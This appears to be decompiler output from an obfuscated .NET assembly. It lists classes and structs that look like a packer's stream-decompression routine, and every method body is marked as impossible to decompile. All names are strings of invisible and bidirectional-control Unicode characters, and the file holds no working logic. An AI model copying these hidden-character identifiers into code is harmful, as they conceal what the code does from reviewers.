    internal \u202C‍⁫‭⁭‎‬‭‍‌‫‍‎‎⁬‍‍⁮‍‍‮‎‭‏⁬‏‬‎⁬⁮⁬⁭‏‏⁭‌⁪‬⁯‎‮()
    {
      // ISSUE: unable to decompile the method.
    }
  }

  internal class \u200E‌⁬‏⁯‏‏⁫‪‏⁫⁯⁭‮⁪‎‪‏‍⁪‭‎⁬⁯‮‬​‌⁮⁪⁬‫‭‏​⁪​‎‫‮
  {
    internal readonly \u003CModule\u003E.\u206E‏‪‬‏‌‍​⁪⁮⁪⁭⁫⁪‌⁮⁪‬‍‬‌⁪‮‮⁫‌‮‪‍‏⁭‮‪‍‬‭⁭⁭​‪‮[] \u200B⁬⁭‌⁭‭⁬⁫⁭‮​⁭‏‬‭​⁫‮‪‫‮⁬⁭⁫‭‬⁬‮⁯‫‭⁯⁭​​‪⁭⁬‮⁯‮;
    internal readonly \u003CModule\u003E.\u206E‏‪‬‏‌‍​⁪⁮⁪⁭⁫⁪‌⁮⁪‬‍‬‌⁪‮‮⁫‌‮‪‍‏⁭‮‪‍‬‭⁭⁭​‪‮[] \u200C⁫⁯​⁪‏‍‏⁪‬‎⁯‭⁮‍‫‏⁯​‮⁭‬‎‎⁬‬‌‏⁮⁯‍‭‎⁮‫‬‌⁭‎⁬‮;
    internal readonly \u003CModule\u003E.\u206E‏‪‬‏‌‍​⁪⁮⁪⁭⁫⁪‌⁮⁪‬‍‬‌⁪‮‮⁫‌‮‪‍‏⁭‮‪‍‬‭⁭⁭​‪‮[] \u200B‭⁮⁪‍⁬⁯‫⁫‮⁯‫⁪⁮‎‮⁫‎‮⁮‫⁯⁫⁯‮‪‍‭‮‎​⁭⁬‫‌⁬‬⁫⁪‎‮;
    internal readonly \u003CModule\u003E.\u206E‏‪‬‏‌‍​⁪⁮⁪⁭⁫⁪‌⁮⁪‬‍‬‌⁪‮‮⁫‌‮‪‍‏⁭‮‪‍‬‭⁭⁭​‪‮[] \u206A‬⁬‬‌⁭⁮⁬‬‪‌‏‌‍⁮‮‪‮‮‏⁫‏⁫‍‮‮⁮⁬‌‍‫‎‮⁪‮‏‏‎⁮⁫‮;
    internal readonly \u003CModule\u003E.\u206E‏‪‬‏‌‍​⁪⁮⁪⁭⁫⁪‌⁮⁪‬‍‬‌⁪‮‮⁫‌‮‪‍‏⁭‮‪‍‬‭⁭⁭​‪‮[] \u206E⁮⁪​‎‎⁪⁭​‍‏⁪‬‍⁯⁯‌‍‌⁯‭‏‭‏‬‭‍​‭‪​‫‌‮⁭⁯‎‌‎‏‮;
    internal readonly \u003CModule\u003E.\u206E‏‪‬‏‌‍​⁪⁮⁪⁭⁫⁪‌⁮⁪‬‍‬‌⁪‮‮⁫‌‮‪‍‏⁭‮‪‍‬‭⁭⁭​‪‮[] \u202E⁪⁫‍⁭‫⁫‬‬‫⁯⁬‮‫‪‭⁭‎‫⁫​‪‬‫‮‏⁪⁪⁬‭​‬⁯⁪‎⁫‮⁭⁬‫‮;
    internal readonly \u003CModule\u003E.\u200E‌⁬‏⁯‏‏⁫‪‏⁫⁯⁭‮⁪‎‪‏‍⁪‭‎⁬⁯‮‬​‌⁮⁪⁬‫‭‏​⁪​‎‫‮.\u206C⁮⁯‭‌‭‏‭‮⁪⁮‪⁮​⁬‪‭⁯⁫⁯‫‎‏‫‭⁮⁫‬‎⁪⁪‭‭‪‪‏⁬⁮‫‌‮ \u200D⁯⁫‫‪‬⁮⁯⁫⁮‬‫‏‭⁮‍‪‭‬‎‌‎‪⁭‍⁭⁫‍‏⁯⁭‫‭⁯‫⁫⁭‬​⁬‮;
    internal readonly \u003CModule\u003E.\u200E‌⁬‏⁯‏‏⁫‪‏⁫⁯⁭‮⁪‎‪‏‍⁪‭‎⁬⁯‮‬​‌⁮⁪⁬‫‭‏​⁪​‎‫‮.\u200C‮‪⁫‎‭‍‍‏‬‍‎‪⁯‫‍​‍‌‪⁬‎‫‪‭‌⁪‏⁬⁫‏⁯⁯‭‌‍⁪⁮⁭‬‮ \u202E⁫‬⁪‮⁭⁬⁬⁫⁪⁬‮⁭‬‌⁫‪‏⁪‎‮‏⁬‭⁭⁯‌​⁪⁪⁪⁪‌‏⁫‎‍‍⁫‪‮;
    internal readonly \u003CModule\u003E.\u206F⁯⁮‎⁬‫⁪‏‪‌‎‫‌⁬⁫⁪‬‪​‍‏‍‏‍⁮‭​‌⁪‍‍‮‏‫‍‫‌⁯⁫‬‮ \u202E⁯⁫‭⁪​⁭‭​‭‫‌‍‏‎⁪‮‪‬‏‏‍⁭⁮‫‬⁯‏‪⁪‭‎‎⁯‮​‍‬‍‏‮;
    internal readonly \u003CModule\u003E.\u206E‏‪‬‏‌‍​⁪⁮⁪⁭⁫⁪‌⁮⁪‬‍‬‌⁪‮‮⁫‌‮‪‍‏⁭‮‪‍‬‭⁭⁭​‪‮[] \u202B⁪‮​‮‌‮‎‬‭‎‏⁭‏⁯⁯‏⁭​‪‍‎​‍⁭⁫‌⁬⁫‪⁪‏⁮‪‏‪‌⁬‬⁬‮;
    internal readonly \u003CModule\u003E.\u206E⁪⁮⁪‌‎⁪‪‫⁭‪⁭‮‮⁮⁮⁪⁬‪⁯‎⁪⁮‍⁮⁮‮‮‏‫‫‏⁫⁭‌​‍⁮‍⁪‮[] \u206F‮‮‮​​⁭‌⁭⁮‎‭‭‭⁪⁯‍⁬‍‮⁭‪‌⁪‭‏‬‎​‪‫‎​‭‮⁬⁬‏⁫‬‮;
    internal readonly \u003CModule\u003E.\u202C‍⁫‭⁭‎‬‭‍‌‫‍‎‎⁬‍‍⁮‍‍‮‎‭‏⁬‏‬‎⁬⁮⁬⁭‏‏⁭‌⁪‬⁯‎‮ \u206B⁬⁮⁭‭‫⁭⁭⁫⁫⁯‎‭‎‏‫⁮⁬‏‪‍⁮⁯⁫​‪⁪⁭⁭‭‪‏‭‌⁮‫‎⁬‮⁭‮;
    internal readonly \u003CModule\u003E.\u200E‌⁬‏⁯‏‏⁫‪‏⁫⁯⁭‮⁪‎‪‏‍⁪‭‎⁬⁯‮‬​‌⁮⁪⁬‫‭‏​⁪​‎‫‮.\u206C⁮⁯‭‌‭‏‭‮⁪⁮‪⁮​⁬‪‭⁯⁫⁯‫‎‏‫‭⁮⁫‬‎⁪⁪‭‭‪‪‏⁬⁮‫‌‮ \u200E⁭⁭⁯‎‎⁮‍‍⁯‌‭​‏⁪⁬‎⁭‎⁫⁮‎⁫‮‭​‏‍⁬‏‍‪‪⁮‪⁯‍‍​⁭‮;
    internal bool \u206E‪‬‬‍⁮‍‭⁫‮‌‬⁫‏‬‬‍‍‍‍‏⁫​⁮⁮⁫⁬‍‭‌​⁪⁭‍⁬‎⁭‏‭‬‮;
    internal uint \u206E​⁭‎‬⁭​​⁫‬‫‭‍⁪‮⁯‍‍⁪‮⁬⁪⁭⁯⁮⁮‎‎⁬‎⁪⁬‏⁬⁪⁬‎‫‪⁫‮;
    internal uint \u200D⁭‎‍‭‏‫‌⁬‮⁬‍⁪​‍⁮‫‎‪⁪​‍‏‭‮​‌⁯‭‎‭‫‮⁯⁭⁫‬‏‪⁪‮;
    internal \u003CModule\u003E.\u206E⁪⁮⁪‌‎⁪‪‫⁭‪⁭‮‮⁮⁮⁪⁬‪⁯‎⁪⁮‍⁮⁮‮‮‏‫‫‏⁫⁭‌​‍⁮‍⁪‮ \u202A‬‬‎‌‪⁪‏‌⁮⁪‏‏‍‬‪‍⁬⁬⁪‫‌⁫‎⁫⁬‏‫⁭⁪‍‮‬‍‏‮‬‌‍⁮‮;
    internal uint \u202C⁯‫‪‫⁮⁯⁬‬‎‪‫‌‏‪​‬⁪​‪‏⁪⁭‭‍⁪‮‍‌‌⁬‭​⁯‮‏‫‏⁫⁮‮;

    internal \u200E‌⁬‏⁯‏‏⁫‪‏⁫⁯⁭‮⁪‎‪‏‍⁪‭‎⁬⁯‮‬​‌⁮⁪⁬‫‭‏​⁪​‎‫‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u200E‍‎⁪​‭⁪⁪‎‏​‌‬⁫⁬⁪⁯⁫‍‫‌‏‌‍‏‪⁪⁮⁭‪‎‏‎‪‌⁪‮‏‮‫‮([In] uint obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u202A‌⁯⁬‎‪⁫‫‮‫‪‮‎‭‫‎‪‪⁪‌​‪⁪‍⁫‪‮‬⁭‫‏⁯⁬⁭‪​‪‬‪⁫‮([In] int obj0, [In] int obj1)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u200F‪‌⁫‭‬⁬‫‪⁮⁯‌‪⁬⁪⁪‪⁪⁫⁭‏⁬‪‪​‌‎⁫⁮‭⁬⁫⁯⁮‏⁬‭‌‫‍‮([In] int obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u206C⁮⁯​‫‍‎‫‪‏‌‍‪⁮‏‎‌‏‮‭⁫‎‭⁪‌​‮⁭⁬⁭⁬‪‪‍⁬⁪‭⁯⁯‭‮([In] Stream obj0, [In] Stream obj1)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u206B‭⁮‌⁭‮‏​⁭‏⁫⁪⁫‪⁮⁬‭⁮⁬⁮⁫‮‎⁮⁪‌‌‪‏‭‏⁬‍‌‍‏​‏‮‍‮(
      [In] Stream obj0,
      [In] Stream obj1,
      [In] long obj2,
      [In] long obj3)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u200B‏‬​⁭‬⁪⁮‏⁪‍‬‎‮⁪‭⁮‍⁫‍⁬​⁫‪⁮‭‪⁬⁭‬‏‎⁮‬​‪‬⁮⁫⁯‮([In] byte[] obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal static uint \u200B⁫‪‌⁯⁯​⁫‌‌‎‮⁬‌‪‍⁪⁭⁮‮⁮⁫‏⁯‭​⁪‫‎‬‮⁬‪‎⁮​‫‮‎‏‮([In] uint obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal class \u206C⁮⁯‭‌‭‏‭‮⁪⁮‪⁮​⁬‪‭⁯⁫⁯‫‎‏‫‭⁮⁫‬‎⁪⁪‭‭‪‪‏⁬⁮‫‌‮
    {
      internal readonly \u003CModule\u003E.\u206E⁪⁮⁪‌‎⁪‪‫⁭‪⁭‮‮⁮⁮⁪⁬‪⁯‎⁪⁮‍⁮⁮‮‮‏‫‫‏⁫⁭‌​‍⁮‍⁪‮[] \u206B⁮‫‬⁯⁮⁬‍‎‪​⁬⁪‌‪⁬⁪‭⁪⁭‏‫‮⁪⁯⁪‌‮‏⁯⁪‮⁫​‭⁮‏‎‮;
      internal readonly \u003CModule\u003E.\u206E⁪⁮⁪‌‎⁪‪‫⁭‪⁭‮‮⁮⁮⁪⁬‪⁯‎⁪⁮‍⁮⁮‮‮‏‫‫‏⁫⁭‌​‍⁮‍⁪‮[] \u206B‭‍⁯​⁮⁯‮‏‌‎‮‎​‎⁭‮‭⁮‏‭⁮⁫⁬‪⁮⁮‍⁪⁮‮‬⁮⁬‍‍‏​‎‌‮;
      internal \u003CModule\u003E.\u206E‏‪‬‏‌‍​⁪⁮⁪⁭⁫⁪‌⁮⁪‬‍‬‌⁪‮‮⁫‌‮‪‍‏⁭‮‪‍‬‭⁭⁭​‪‮ \u202C‌‎‬⁫‭⁮‏‫​‪‌⁪⁯‍‭⁪‍‏​‮‍‌⁮‌⁫‬​‬⁫‫‭⁯‬‭‭‫​⁭‪‮;
      internal \u003CModule\u003E.\u206E‏‪‬‏‌‍​⁪⁮⁪⁭⁫⁪‌⁮⁪‬‍‬‌⁪‮‮⁫‌‮‪‍‏⁭‮‪‍‬‭⁭⁭​‪‮ \u206F⁮‎⁯‎⁭⁬⁫⁯⁪‮⁬‪⁯⁪⁪‬⁪‮⁬‬⁭‎⁪‫‬⁮‌⁮⁭⁭​‫‍⁯⁭⁭⁭⁮⁮‮;
      internal \u003CModule\u003E.\u206E⁪⁮⁪‌‎⁪‪‫⁭‪⁭‮‮⁮⁮⁪⁬‪⁯‎⁪⁮‍⁮⁮‮‮‏‫‫‏⁫⁭‌​‍⁮‍⁪‮ \u200C‪‌‭⁫‌‌‎‪⁭‫‭⁯‌⁯‪‏‏‏⁮‫⁭‍⁭⁬⁬​‍‮‏‌‌⁭‍‏‮⁯‭‎‎‮;
      internal uint \u206D‬⁯⁮⁪‭‬​​⁮‫‫⁭‎⁬⁫‎‭⁮​⁬‭​‏‍⁯⁮⁬⁬⁮⁪‎‌‪⁫⁯⁪​‏‮‮;

      internal void \u200F⁬‬‬‌‭‫⁯‬‫‮‏⁭‌‎‫‪‌‫⁯⁪⁪‫‪⁪‬‬⁬⁭‪‏‬‎‎‮‎‍‬⁮‮([In] uint obj0)
      {
        // ISSUE: unable to decompile the method.
      }

      internal void \u202D‍⁬​⁬‪⁮‌‌‮⁮⁮⁫‫⁭​​‬‏⁮‏‮‍​⁬‮⁪‬‌‍​‍‮‭‍⁪⁮‬‮‫‮()
      {
        // ISSUE: unable to decompile the method.
      }

      internal uint \u206A‪‮‮⁭‫‎‎⁫⁯‪⁭⁪‎⁭‫‍⁫‭‪⁬‫⁫⁬⁫⁫‫⁯⁬‎‎⁪‭⁫‍‏‌‬‎‫‮(
        [In] \u003CModule\u003E.\u202C‍⁫‭⁭‎‬‭‍‌‫‍‎‎⁬‍‍⁮‍‍‮‎‭‏⁬‏‬‎⁬⁮⁬⁭‏‏⁭‌⁪‬⁯‎‮ obj0,
        [In] uint obj1)
      {
        // ISSUE: unable to decompile the method.
      }

      internal \u206C⁮⁯‭‌‭‏‭‮⁪⁮‪⁮​⁬‪‭⁯⁫⁯‫‎‏‫‭⁮⁫‬‎⁪⁪‭‭‪‪‏⁬⁮‫‌‮()
      {
        // ISSUE: unable to decompile the method.
      }
    }

    internal class \u200C‮‪⁫‎‭‍‍‏‬‍‎‪⁯‫‍​‍‌‪⁬‎‫‪‭‌⁪‏⁬⁫‏⁯⁯‭‌‍⁪⁮⁭‬‮
    {
      internal \u003CModule\u003E.\u200E‌⁬‏⁯‏‏⁫‪‏⁫⁯⁭‮⁪‎‪‏‍⁪‭‎⁬⁯‮‬​‌⁮⁪⁬‫‭‏​⁪​‎‫‮.\u200C‮‪⁫‎‭‍‍‏‬‍‎‪⁯‫‍​‍‌‪⁬‎‫‪‭‌⁪‏⁬⁫‏⁯⁯‭‌‍⁪⁮⁭‬‮.\u206A‍⁯​⁮⁮‭⁯⁬‮⁬⁭‭‭⁬⁯⁮⁯​⁭‏⁭⁫⁫‫‍‎‏⁭‮‪​‏‫⁭‏⁮‍⁭⁪‮[] \u200C‮⁯⁭‫⁪⁮‏‫‏⁪⁫‏‌⁯‮‎‮‏⁭‍⁯​‬​‪‮⁭‪⁮⁪⁪⁭‪⁫‍⁮‏‭‌‮;
      internal int \u206A‮⁫⁯⁫​‫‮‎⁫‏⁪‬‮‫‫‭⁮​⁭‍⁭‍‮‍‏‎‏‮⁭⁪‮‪​⁬⁫‎⁮‌‍‮;
      internal int \u200B‭‫⁪‫‪⁬⁪‬‮⁬‫‎‌‍​⁪‪‌⁭⁯⁯‬‬‬⁬⁪⁯​⁬‪‎⁮‏⁮‌‍⁪‮‭‮;
      internal uint \u202A⁫‪‎‭⁬​⁯⁯⁫​‏‭‏‫​‌‫​​​‏⁬‌⁯‮⁪‏‬‌⁯⁮⁫⁬⁬⁬⁭‍‏‏‮;

      internal void \u202D⁭‪‪⁮⁬​⁭⁬‭‎‭‎⁪⁪⁫‭‎‬‭⁪‍‬‍‮‍⁬‬⁬⁯‌‮‮⁭⁪​‪⁫⁫⁬‮([In] int obj0, [In] int obj1);

      internal void \u206D‪⁫⁪⁮​⁭‮⁮‮‬‏⁮‪​⁯⁬​‫⁫⁮‪‎‏​‭⁬​​‪‎⁯‌‫⁯‬‎‬‫⁬‮()
      {
        // ISSUE: unable to decompile the method.
      }

      internal uint \u200C‮⁮‬‪⁮⁪⁫​‎⁬‮‬‪‫‬‍⁬⁭⁪⁬​⁮‎‏‮‭⁪⁪⁯‫​⁬⁮⁮‌‎‍‌‮‮([In] uint obj0, [In] byte obj1)
      {
        // ISSUE: unable to decompile the method.
      }

      internal byte \u206D⁫⁮‌‪‪​⁬‍⁯‮⁬‪‪‏‍‎‭⁮⁯‌‍⁭⁪‍‪⁬‬⁬‪⁮⁪‬‍‫‫⁭‮‮⁬‮(
        [In] \u003CModule\u003E.\u202C‍⁫‭⁭‎‬‭‍‌‫‍‎‎⁬‍‍⁮‍‍‮‎‭‏⁬‏‬‎⁬⁮⁬⁭‏‏⁭‌⁪‬⁯‎‮ obj0,
        [In] uint obj1,
        [In] byte obj2)
      {
        // ISSUE: unable to decompile the method.
      }

      internal byte \u202B⁬⁭⁬⁮‭‮⁬‬‪‭⁯‪⁪‪‌⁫‮⁯⁭⁯‭⁪‎‪⁭⁬‬‪​⁮‬‪⁫‎​⁫‮⁫‫‮(
        [In] \u003CModule\u003E.\u202C‍⁫‭⁭‎‬‭‍‌‫‍‎‎⁬‍‍⁮‍‍‮‎‭‏⁬‏‬‎⁬⁮⁬⁭‏‏⁭‌⁪‬⁯‎‮ obj0,
        [In] uint obj1,
        [In] byte obj2,
        [In] byte obj3)
      {
        // ISSUE: unable to decompile the method.
      }

      internal \u200C‮‪⁫‎‭‍‍‏‬‍‎‪⁯‫‍​‍‌‪⁬‎‫‪‭‌⁪‏⁬⁫‏⁯⁯‭‌‍⁪⁮⁭‬‮()
      {
        // ISSUE: unable to decompile the method.
      }

      internal struct \u206A‍⁯​⁮⁮‭⁯⁬‮⁬⁭‭‭⁬⁯⁮⁯​⁭‏⁭⁫⁫‫‍‎‏⁭‮‪​‏‫⁭‏⁮‍⁭⁪‮
      {
        internal \u003CModule\u003E.\u206E‏‪‬‏‌‍​⁪⁮⁪⁭⁫⁪‌⁮⁪‬‍‬‌⁪‮‮⁫‌‮‪‍‏⁭‮‪‍‬‭⁭⁭​‪‮[] \u202C⁪‍⁯‫‏‭‏⁪‫⁬‮‎‫‪‫‏⁬‌‬‭​‭‏⁭‪‍‏‬⁫⁪⁭‌⁪‌‎⁭‏‍‌‮;

        internal void \u206A⁮⁪⁪⁮‪‫‌‎⁭‍​⁬⁭⁮‫​‭‎⁬⁮‪‌‏⁮‫⁮‏‬‪‭‮⁯⁭‫‪⁪⁭‎‭‮()
        {
          // ISSUE: unable to decompile the method.
        }

        internal void \u202D‍‍⁪‎⁪‎‍‏‍‪⁪⁫‭⁮‌‬‍‍‏⁭‎‬‌⁪‌⁭⁫​‬‏‌‏⁫⁭‎‏⁯‫⁪‮()
        {
          // ISSUE: unable to decompile the method.
        }

        internal byte \u200E⁪‍‎‫‌⁮‪‪⁫‫‪‬‬⁬⁮⁯​​‎‫‏‌‮⁮⁯⁬⁪⁬⁫‮‎⁪‫‫‫‮‌‬‬‮(
          [In] \u003CModule\u003E.\u202C‍⁫‭⁭‎‬‭‍‌‫‍‎‎⁬‍‍⁮‍‍‮‎‭‏⁬‏‬‎⁬⁮⁬⁭‏‏⁭‌⁪‬⁯‎‮ obj0)
        {
          // ISSUE: unable to decompile the method.
        }

        internal byte \u200F​⁯‬‭⁪‮⁫‫‌‬⁫‬⁬‌‪⁫‍‎‌​‮‎‮‌⁫⁬‌⁮‪⁯​⁯‬‬​⁪⁯‬‮(
          [In] \u003CModule\u003E.\u202C‍⁫‭⁭‎‬‭‍‌‫‍‎‎⁬‍‍⁮‍‍‮‎‭‏⁬‏‬‎⁬⁮⁬⁭‏‏⁭‌⁪‬⁯‎‮ obj0,
          [In] byte obj1)
        {
          // ISSUE: unable to decompile the method.
        }
      }
    }
  }

  internal class \u206F⁯⁮‎⁬‫⁪‏‪‌‎‫‌⁬⁫⁪‬‪​‍‏‍‏‍⁮‭​‌⁪‍‍‮‏‫‍‫‌⁯⁫‬‮
  {
    internal byte[] \u200B⁪⁯⁮⁯‬‭‏‍‍‍‎⁪⁮‬⁪‪⁬⁫‍‌‎‌‮‌‏‫‍‎‌‪⁫‮⁪⁮⁯‏‍‏‫‮;
    internal uint \u202C‌‬⁪‪⁭⁫‌⁯⁯‌‏⁭‪⁬‬​⁮‭‪‭‍‪‌‭⁮⁯‭⁭‭‪⁪⁬​‍‮‌‍​‭‮;
    internal Stream \u200C⁬‭⁮‌‫‮⁯‌⁯‎‫⁬​⁪‎‪‪⁪⁪⁬⁪⁮‬‬⁬‫‭⁭‫⁮⁯‌⁫⁫‍⁮‭⁭‎‮;
    internal uint \u200D‍⁫‎‮⁪⁭⁮​⁫‎⁮⁫‪‍‫⁬⁮⁬⁭‍⁪⁮‎⁪‬‮‪‏⁮‫‌‬‏⁯‬‍​⁯⁮‮;
    internal uint \u206A‏⁭‫⁯⁮‌⁭⁭⁫‏⁯‎‫⁮⁫⁫⁪‍⁫‭⁪⁮‪⁪​⁯⁭‭‫‫⁯​‌⁭⁯‍‏⁪⁪‮;

    internal void \u200E‎‏​​⁪‏⁭​⁪⁭‬‮⁯‪⁭‎‏‌⁬‭⁪‬‬⁭⁪‫⁪‌‫‎‭‪‬⁯⁬‍‭‮‎‮([In] uint obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u200D‬⁮⁫‮​‏‫‫⁬⁭‏​‫⁫⁮‏‌​⁭​​‪‮‎‏⁮‫‌‫⁯⁪‫⁫⁭‭‮⁭​⁪‮([In] Stream obj0, [In] bool obj1)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u200C‏⁯​⁬‌‮‪‏‏‪​‮⁭⁯‪‏​‮⁬⁭​‎⁫‎‏‏⁯‬‪‭‮⁮⁪‫‎⁭⁪‭‏‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u202B‎‭‌‏⁪‎​‌‫‏‮⁭⁭‮⁮⁬⁬⁭‭‬⁪‪​‏⁬‭‎‍‭⁪⁪‍‭‌‪⁯‬​‪‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u200E​‍‬‮‎‎​‍‪‎‭‪‪‭⁭‏‏‎‬⁯‎⁮‬‌‎‌⁫⁮‮⁫‫⁯‬‏⁮‫‎‍‮([In] uint obj0, [In] uint obj1)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u200F‮‫⁪‍⁯‮‫‌‪‭⁪​‬⁫‪⁭⁬⁭⁬‌‍‫​⁮‎‭⁫​‮‬‪⁬‌​‬‌‮‮‫‮([In] byte obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal byte \u206E‬‍⁪‏‌‍⁬‏⁮‎⁭⁫⁭‏​‬‍‌⁫‫‌⁬‎‎⁮‭‍‮‬‌⁯⁪⁫⁮‭​‫⁭‮([In] uint obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal \u206F⁯⁮‎⁬‫⁪‏‪‌‎‫‌⁬⁫⁪‬‪​‍‏‍‏‍⁮‭​‌⁪‍‍‮‏‫‍‫‌⁯⁫‬‮()
    {
      // ISSUE: unable to decompile the method.
    }
  }

  internal struct \u202D‌‎⁮⁫‍‏⁮⁪‮‌‪‬⁭‍⁮⁪‍⁮‫⁭‬⁯⁬⁪​⁪‏​‎‫⁭​‍⁬‪‪‭‭‪‮
  {
    internal uint \u206F⁬‎‏‫‪‎‬‮‬‎⁪‫‏‏‍‭⁯‮⁯⁫‏⁫⁮‫‪⁬⁬⁪‫​⁯‮‏‬‭​‭‬⁮‮;

    internal void \u200B‏⁮⁯⁯⁯​‍‏‪⁬⁫‭⁯⁭‬‎⁮‮‌‏⁭⁭‬‬⁯‍‌‍‬⁮⁮‏⁭⁭⁪⁮‏‭⁮‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u202C‬‎‪‭⁪​‎‎‫⁯‬​‭‍‍⁫‏‌‮‍‎⁯⁪⁬⁫⁭‍⁬⁪‬⁪‭‬⁮‍‬⁯⁫⁬‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u202B‏‫⁬‍‍‍⁭⁮​⁮‮⁮⁫‫‫‌⁪‮⁬⁬‮‫‬‭‎​‬‭‭⁬​⁪‬‫‭‍‭‌⁭‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u200C‮‏⁭⁮⁮⁪⁯‎‬​⁭‮⁯‬‎‮‏‮⁫‍‫‎‏⁬⁯‮​‎‮‬⁭‎‌⁫‎⁪‪‪⁪‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u200B‭‏‬⁫⁭⁮‬‮‪‌‍⁭‌‮‏‏‌‮​⁯‭​‬‭⁫‍‫⁫⁪‭‮‎⁮‍‬‎‫‬‭‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal bool \u202C⁫‎⁫‏⁫‍‮⁯⁯‌​⁮⁫⁬⁮‭⁮⁬​​‮‬‫⁮‏⁪‍‏​⁪​‬​⁫⁬‏⁯‏⁯‮()
    {
      // ISSUE: unable to decompile the method.
    }
  }

  [StructLayout(LayoutKind.Explicit, Size = 256)]
  internal struct \u200F⁪‍⁯⁫‭‏‌‫⁭⁭⁮‬​⁫‍⁪‎‏⁫‎⁪‌‏‫‭‌⁫‪‌‌‪‫⁬​‬⁭‫⁫‮
  {
  }

  [StructLayout(LayoutKind.Explicit, Size = 448, Pack = 1)]
  internal struct \u206C⁫‎⁫‫⁫‮⁬⁪‪⁫‌‬‬​‪⁬⁭‍‍⁭‏⁮⁭‫‪‪‌‪⁪‬​‪‎‮⁭‮⁮‮‏‮
  {
  }
}
